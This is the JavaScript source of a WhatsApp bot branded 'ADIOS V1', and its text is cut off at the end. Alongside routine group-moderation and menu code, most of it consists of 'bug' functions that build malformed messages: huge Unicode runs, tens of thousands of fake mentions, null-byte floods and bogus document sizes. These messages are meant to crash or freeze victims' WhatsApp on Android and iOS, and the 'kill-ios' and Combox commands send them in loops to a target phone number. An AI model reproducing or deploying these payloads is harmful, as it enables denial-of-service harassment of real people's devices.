module.exports = async (ZoO, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
/*const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : */
const prefix = "."
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const To = ["https://img100.pixhost.to/images/590/539272068_skyzopedia.jpg"]
const ytta = To[Math.floor(Math.random() * To.length)]
const Tol = ["https://files.catbox.moe/mahenr.mp3"]
const ytt = Tol[Math.floor(Math.random() * Tol.length)]
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const Premium = JSON.parse(fs.readFileSync('./Databases/database/murbug.json'))
const owner = JSON.parse(fs.readFileSync('./Databases/database/owner.json'))
const pantek = ["https://files.catbox.moe/mahenr.mp3"]
const sound1 = pantek[Math.floor(Math.random() * pantek.length)]
const Toll = ["https://files.catbox.moe/mahenr.mp3"]
const sound2 = Toll[Math.floor(Math.random() * Toll.length)]
const Tolll = ["https://files.catbox.moe/mahenr.mp3"]
const sound3 = Tolll[Math.floor(Math.random() * Tolll.length)]
const Mek = ["https://files.catbox.moe/mahenr.mp3"]
const sound4 = Mek[Math.floor(Math.random() * Mek.length)]
const wdh = ["https://files.catbox.moe/mahenr.mp3"]
const sound5 = wdh[Math.floor(Math.random() * wdh.length)]
const pol = ["https://files.catbox.moe/mahenr.mp3"]
const sound6 = pol[Math.floor(Math.random() * pol.length)]
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const jsobfus = require('javascript-obfuscator');
const botNumber = await ZoO.decodeJid(ZoO.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const kontol = m.key.fromMe ? ZoO.user.id.split(':')[0x0] + '@s.whatsapp.net' || ZoO.user.id : m.key.participant || m.key.remoteJid;
const isGroup = m.chat.endsWith('@g.us')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await ZoO.groupMetadata(m.key.remoteJid) : {}
let participant_bot = (isGroup ? groupMetadata.participants.find((v) => v.id == m.botNumber) : {}) || {}
let participant_sender = (isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}) || {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const qtext = q = args.join(" ")
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./Databases/function.js')
const antilink = JSON.parse(fs.readFileSync('./Databases/database/antilink.json'))
const antilink2 = JSON.parse(fs.readFileSync('./Databases/database/antilink2.json'))
const contacts = JSON.parse(fs.readFileSync("./Databases/database/contacts.json"))
const kosong = fs.readFileSync("./Databases/kosong.jpg")
const { teksCrashUi } = require("./Databases/database/virtex.js")
const { teksf19 } = require("./Databases/database/delay.js")
const { buttonvirus } = require("./Databases/database/buttonvirus.js")
const { explosion } = require("./Databases/vir/bugcrash.js")
const { Veoni } = require("./Databases/vir/xnaf.js")
const { old1, old2, old3 } = require("./Databases/vir/bugold.js")
const { Cluex } = require("./Databases/database/ClueX.js")
const { pinterest, pinterest2, mediafire, tiktokDl } = require('./Databases/scraper');

/*FUNCTION OBFUSCATE*/
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `ASTRALBUG`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}


if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(owner), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `CʀʏɴᴢX Fᴏʀᴄᴇ`
}}}

if (isGroup) {
if (antilink.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await ZoO.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await ZoO.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://h.top4top.io/p_3220inuij9.png", title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await ZoO.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await ZoO.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}}

if (isGroup) {
if (antilink2.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await ZoO.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await ZoO.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://h.top4top.io/p_3220inuij9.png", title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await ZoO.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Bot Whatsapp Realtime`,jpegThumbnail: ""}}}

const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `𝙓 - 𝙏𝙍𝘼𝙎𝙃𝙀𝙍`,jpegThumbnail: ""}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `𝙰𝚂𝚃𝚁𝙰𝙻𝙱𝚄𝙶`,
jpegThumbnail: "",
caption: `𝗔𝗦𝗧𝗥𝗔𝗟𝗫𝗕𝗨𝗚 𖥱 𝗖𝗥𝗔𝗭𝗬`,
inviteExpiration: Date.now() + 1814400000
}
}}

const Out = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid :"status@broadcast"
 }: {})},
 message:
 {"orderMessage":
 {"orderId":"174238614569438",
 "thumbnailUrl": kosong, //image 0kb
 "itemCount": 999999999,
 "status":
 "INQUIRY",
 "surface": "CATALOG",
 "message": `𝗔𝗦𝗧𝗥𝗔𝗟𝗫𝗕𝗨𝗚 𝗡𝗢 𝗖𝗢𝗨𝗡𝗧𝗘𝗥`,
 "token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==" }},
 contextInfo: {"mentionedJid":m.sender.split, "forwardingScore":999,"isForwarded":true}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `𝗫- 𝗔𝗦𝗧𝗥𝗔𝗟`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6287827536016:+6287827536016\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

ZoO.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
};

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}
/// 𝙉𝙚𝙬 𝙂𝗰 𝗕𝘂𝗴𝘀 ///
async function caltx(target) {
          const jids = `_*~@254104301695~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
			let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							scheduledCallCreationMessage: {
								scheduledTimestampMs: Date.now(),
								hasMediaAttachment: true,
								text: ui + jid,
								title: ui + jid,
								contextInfo: { mentionedJid: [ "0@s.whatsapp.net" ] }
								},
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: "𝐀𝐃𝐈𝐎𝐒 𝐕1" }]
							}
						}
					},
				}), {
					userJid: target
				}
			);
			await sam.relayMessage(target, etc.message, {});
		}
  async function freezegc(target) {	
          const jids = `_*~@254113660118~*_\n`.repeat(10200);
	      const ui = 'ꦽ'.repeat(1500);	
		    let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
		           groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 922.999999999999,
                            degreesLongitude: -9229999999999.999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: ui + jid,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: "  " }]
                               }
                            }
						}
					},
				}), {
					userJid: target
				}
			);
			await sam.relayMessage(target, etc.message, {});
		}
		// android new freeze and crash
async function Bugnew(target, pic, Ptcp = true) {
	const jids = `_*~@254113660118~*_\n`.repeat(10800);
	const ui = 'ꦽ'.repeat(1000);
   await sam.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "𝗔𝗭𝗥𝗔𝗘𝗟",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail:pic,
         },
         hasMediaAttachment: true,
        },

									body: { text: 'null' + ui + jids },
									contextInfo: {
										mentionedJid: ['254113660118@s.whatsapp.net'],
										mentions: ['254113660118@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["254113660118@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝗔𝗭𝗥𝗔𝗘𝗟",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
	}
async function BugUi(target, pic, Ptcp = true) {
	const jids = `_*~@254113660118~*_\n`.repeat(10800);
	const ui = 'ꦽ'.repeat(1200);
	const uii = 'ꦾ'.repeat(1200);
   await sam.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "𝗔𝗭𝗥𝗔𝗘𝗟",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail:pic,
         },
         hasMediaAttachment: true,
        },

									body: { text: '📞' + ui + jids + uii },
									contextInfo: {
										mentionedJid: ['254113660118@s.whatsapp.net'],
										mentions: ['254113660118@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["254113660118@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝗔𝗭𝗥𝗔𝗘𝗟",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
	}
// 𝗶𝗼𝘀 𝗻𝗲𝘄 𝗯𝘂𝗴𝘀
async function XiosVirus(jid) {
			sam.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': '⭑̤⟅̊༑ ▾ ⋆✩⋆ ⭑̤' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
			console.log(chalk.red("Succes Send Bug"));
		};

		async function XiosPay(jid) {
			sam.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
			console.log(chalk.red("Succes Send Bug"));
		};

        
async function newgalaxy(target) {
    await ZoO.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Hai?",
                        format: "EXTENSIONS_1"
                    },
                    nativeFlowResponseMessage: {
                        name: 'galaxy_message',
                        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target } });
}
		async function BOM(X, Fuck, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "INSTANT",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: Fuck
									},
									hasMediaAttachment: true
								},
								body: {
									text: "DIE HARD "
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"HI GUYS " + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"FUCK YOU\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"HI GUYS \",\"sections\":[{\"title\":\"FUCK YOU\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY IMPROVEV2 \",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: VisiX
				}
			);

			await ZoO.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("ONE"));
		};
        
async function Combox(target) {
for (let i = 0; i < 20; i++) {
await f8(target)
await BugFrezee(target, Null)
await EncryptMessage(target, Null)
await FrezeeMsg1(target, Null)
await FrezeeMsg2(target, Null)
await newgalaxy(target)
}
console.log(chalk.red.bold(`𝗦𝗘𝗡𝗗𝗘𝗥 𝗖𝗢𝗠𝗕𝗢𝗫 𝗧𝗢 ${target}`))
}

async function Combox2(target) {
for (let i = 0; i < 20; i++) {
await CrashUi(target)
await f19(target)
await PayMent(target)
await BOM(target)
await f7(target)
}
console.log(chalk.red.bold(`𝗦𝗘𝗡𝗗𝗘𝗥 𝗖𝗢𝗠𝗕𝗢𝗫 𝗧𝗢 ${target}`))
}

async function Combox3(target) {
for (let i = 0; i < 20; i++) {
await CrashUi(target)
await f19(target)
await PayMent(target)
await f8(target)
await f9(target)
await f7(target)
await BugFrezee(target)
await EncryptMessage(target)
await FrezeeMsg1(target)
await FrezeeMsg2(target)
await Wow(target)
}
console.log(chalk.red.bold(`𝗦𝗘𝗡𝗗𝗘𝗥 𝗖𝗢𝗠𝗕𝗢𝗫 𝗧𝗢 ${target}`))
}

const reply = bokep => {
      ZoO.sendMessage(m.chat, {
        'text': bokep,
        'contextInfo': {
          'mentionedJid': [kontol],
          'forwardingScore': 0x98967f,
          'isForwarded': true,
          'externalAdReply': {
            'showAdAttribution': true,
            'containsAutoReply': true,
            'title': "𝕯𝖊𝖛𝖎𝖑 𝖆𝖉𝖎𝖔𝖘",
            'body': `𝖆𝖉𝖎𝖔𝖘`,
            'previewType': "PHOTO",
            'thumbnailUrl': 'https://imgur.com/a/nmJcMic',
            'sourceUrl': 'https://whatsapp.com/channel/0029Vajz4XmCnA7pBowZQ53h'
          }
        }
      }, {
        'quoted': qkontak
      });
    };

switch (command) {

case "adios": case "adios": {
const tampilan = `
 ♛  𝘿𝙀𝙈𝙊𝙉 𖤐 𝘼𝘿𝙄𝙊𝙎 𝙑𝟭  ♛ 

 ☠️ 𝙈𝘼𝙎𝙏𝙀𝙍 : 𝔇𝔢𝔳𝔦𝔩 𝔄𝔡𝔦𝔬𝔰  
 🔥 𝙀𝙉𝙏𝙄𝙏𝙔 : 𝔄𝔇𝔦𝔬𝔰 𝔙1  
 ⚔️ 𝙑𝙀𝙍𝙎𝙄𝙊𝙉 : 𝕴.𝕺.𝕺  
 ⛓️ 𝙀𝙏𝙀𝙍𝙉𝘼𝙇 𝙐𝙋𝙏𝙄𝙈𝙀 : ${runtime(process.uptime())} 

╭ ♛  ♛ 
│𖤐 hauntnet
│𖤐 corrupt
│𖤐 chaos
│𖤐 erase
│𖤐 blackout
│𖤐 shadowrun
╰───────────────╼  

╭ ♛  ♛   
│𖤐  
│𖤐 
│𖤐   
│𖤐
│𖤐 
╰───────────────╼  

╭ ♛ ♛ 
│𖤐 
│𖤐 
│𖤐 
│𖤐 
╰───────────────╼  

╭ ♛   ♛  
│𖤐 
│𖤐
╰───────────────╼  

╭ ♛ 𝗢𝗪𝗡𝗘𝗥 𝗗𝗘𝗩𝗜𝗟𝗥𝗬 ♛ 
│ ♛ 𝗦𝗘𝗟𝗙
│ ♛ 𝗣𝗨𝗕𝗟𝗜𝗖  
│ ♛  
╰───────────────╼  

╭ ♛ ♛ 
│ ♛ 
│ ♛ 
│ ♛ 
│ ♛ 
│ ♛ 
│ ♛ 
╰───────────────╼  `
let menu = {
image: {url: `${ytta}`}, 
  caption: tampilan,
  contextInfo:{externalAdReply:{
  title: 'ADIOS V1',
  body: 'AZRAEL TEAM', 
  showAdAttribution: true,
  thumbnailUrl: 'https://img100.pixhost.to/images/590/539272068_skyzopedia.jpg',
  mediaType: 4,
  MediaUrl: 'https://whatsapp.com/channel/0029VarWW4T47Xe43y5oUE1y',
  sourceUrl: "https://whatsapp.com/channel/0029VarWW4T47Xe43y5oUE1y",
  }}
  }
await ZoO.sendMessage(from, menu, {quoted: Out }
);
await ZoO.sendMessage(m.chat, {audio: {url: `${ytt}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break


case "public": {
if (!isCreator) return reply("JUST BUY ACCES FROM ADIOS")
ZoO.public = true
reply("hello*")
}
break
// 𝐁𝐮𝐠 𝐈𝐨𝐬
case "ashios": case "kill-ios": {
if (!isOwner) return reply(`*YOU ARE NOT A PREMIUM MEMBER DIMWIT*`)
if (!q) return reply(`Example\n ${prefix + command} 254xxxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("  ADIOS IS BUGGING")
for (let i = 0; i < 10; i++) {
await XiosPay(target)
await XiosVirus(target)
await sleep(1)
}
sam.sendMessage(m.chat, {react: {text: '💥', key: m.key}})
}
break
case "ping": case "speed": { 
let timestamp = speed()
let latensi = speed() - timestamp

         m.reply (`━━━━━━━━━━━━━━━━━\n\◈ADIOS V1  𝚂𝙿𝙴𝙴𝙳   : ${latensi.toFixed(4)} 𝐌𝐒\n\━━━━━━━━━━━━━━━━━`); 
         } 
 break; 
case "runtime":
                let pinga = ` ADIOS IS ACTIVE ${runtime(process.uptime())}`
               sam.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `ADIOS V1`,
